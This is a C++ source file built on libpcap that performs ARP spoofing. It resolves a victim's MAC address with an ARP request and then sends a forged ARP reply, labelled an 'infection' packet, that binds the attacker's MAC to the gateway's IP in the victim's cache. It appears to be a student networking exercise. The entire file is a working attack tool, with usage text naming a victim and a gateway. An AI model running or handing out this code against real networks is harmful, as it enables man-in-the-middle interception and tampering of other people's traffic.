/* send ARP reply for ARP spoofing */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include <linux/if_ether.h>
#include <netinet/ether.h>

#include <arpa/inet.h>
#include <pcap.h>

#include "packet.h"
#include "sysinfo.h"

using namespace packet;
using sysinfo::getDevMac;
using sysinfo::getSrcIPStr;



void printMacAddr(const char *, uint8_t *);
void printPacket(u_char *p);

class ArpHandler {
  public:
	const char *BROADCAST_ETH_STR   = "ff:ff:ff:ff:ff:ff";
	const char *ARP_REQ_DST_MAC_STR = "00:00:00:00:00:00";
	enum Len {
		ETH_HEADER      = 14, // 6 + 6 + 2
		IP_STR_BUF      = 16,
		MAC_STR_BUF     = 18
	};
	enum ArpOpcode {
		REQUEST = 0x0001,
		REPLY   = 0x0002
	};

  private:
	pcap_t *handle;
	char *dev;
	EthArpPacket packet;
	char src_ip_str[Len::IP_STR_BUF];
	char src_mac_str[Len::MAC_STR_BUF];

  public:	
	ArpHandler(pcap_t *_handle, char *_dev) {
		this->handle = _handle;
		this->dev = _dev;
		getSrcIPStr(dev, src_ip_str);
		getDevMac(dev, src_mac_str);
		printf("this host's ip  : %s\n", src_ip_str);
		printf("this host's mac : %s\n", src_mac_str);
	}
	~ArpHandler() {
		pcap_close(handle);
	}
	int sendARPRequest(char *dst_ip_str) {
		fillEthHeader(&packet.eth, src_mac_str, BROADCAST_ETH_STR, ETH_P_ARP);
		fillArpPacket(&packet.arp, src_mac_str, ARP_REQ_DST_MAC_STR, src_ip_str, dst_ip_str, ArpOpcode::REQUEST);
		// printPacket((u_char *)&packet);
		if (pcap_sendpacket(handle, (u_char *)&packet, sizeof(EthArpPacket)) == -1) {
			fprintf(stderr, "[*] send error : %s\n", pcap_geterr(handle));
			return 0;
		}
		return 1;
	}
	int recvARPReply(char *sender_ip_str, char *mac_str) {
		/**
		 * input  : sender_ip_str
		 * output : mac_str (indirect)
		 * */
		while (true) {
			struct pcap_pkthdr *header;
			const u_char *recv_packet;

			int res = pcap_next_ex(handle, &header, &recv_packet);
			if (res == 0)
				continue;
			if (res == -1 || res == -2)
				return 0;
			EthHeader *eth = (EthHeader *)recv_packet;
			if (eth->ether_type == htons(ETH_P_ARP)) {
				printPacket((u_char *)recv_packet);
				ArpPacket *arp = (ArpPacket *)(recv_packet + Len::ETH_HEADER);
				// in this case, inet_ntoa is better than inet_ntop
				if (arp->opcode == htons(ArpOpcode::REPLY)) {
					struct in_addr src_ip;
					src_ip.s_addr = arp->src_ip;
					if (!strncmp(inet_ntoa(src_ip), sender_ip_str, Len::IP_STR_BUF - 1)) {
						strncpy(mac_str, ether_ntoa((ether_addr *)arp->src_mac), Len::MAC_STR_BUF - 1);
						return 1;
					}
				}
			}
			return 0;
		}
	}
	int sendARPInfection(char *target_ip_str, char *victim_ip_str, char *victim_mac_str) {
		///////////////// SEND ARP REPLY ( ARP SPOOFING )
		fillEthHeader(&packet.eth, src_mac_str, victim_mac_str, ETH_P_ARP);
		fillArpPacket(&packet.arp, src_mac_str, victim_mac_str, target_ip_str, victim_ip_str, ArpOpcode::REPLY);
		// printMacAddr("src_mac : ", packet->eth.src_addr);
		// printMacAddr("dst_mac : ", packet->eth.dst_addr);
		printf(" === APR Spoofing Packet \n");
		printPacket((u_char *)&packet);
		if (pcap_sendpacket(handle, (u_char *)&packet, sizeof(EthArpPacket)) == -1) {
			fprintf(stderr, "[*] send error : %s\n", pcap_geterr(handle));
			return 0;
		}
		return 1;
	}
	void goARPSpoofing(char *target_ip_str, char *victim_ip_str) {
		// try-catch로 할까 하다가, if 중첩도 아니고 하니 C와의 호환성 쪽을 선택했다.
		char victim_mac_str[Len::MAC_STR_BUF];
		if (!sendARPRequest(victim_ip_str)) {
			exit(EXIT_FAILURE);
		}
		if (!recvARPReply(victim_ip_str, victim_mac_str)) {
			fprintf(stderr, "recvARPReply Error");
			exit(EXIT_FAILURE);
		}
		if (!sendARPInfection(target_ip_str, victim_ip_str, victim_mac_str)) {
			fprintf(stderr, "infectVictim Error");
			exit(EXIT_FAILURE);
		}
	}
};

void usage(char *fname) {
	printf("syntax: %s <interface> <sender ip(victim)> <target ip(gateway)>\n", fname);
	printf("sample: %s wlan0 192.168.110.129 192.168.110.1\n", fname);
}

int main(int argc, char *argv[]) {
	if (argc != 4) {
		usage(argv[0]);
		return -1;
	}
	char *dev = argv[1];
	char *victim_ip_str = argv[2];
	char *target_ip_str = argv[3];

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	ArpHandler arp(handle, dev);
	arp.goARPSpoofing(target_ip_str, victim_ip_str);

	pcap_close(handle);
	return 0;
}



void printMacAddr(const char *str, uint8_t *a) {
	printf("%s", str);
	printf("%02x:%02x:%02x:%02x:%02x:%02x\n", a[0], a[1], a[2], a[3], a[4], a[5]);
}

void printPacket(u_char *p) {
	int i;
	for (i = 1; i < sizeof(EthArpPacket); i++) {
		printf("%02x ", p[i - 1]);
		if (i % 16 == 0) {
			printf("\n");
		}
	}
	printf("%02x ", p[i]);
	printf("\n");
}
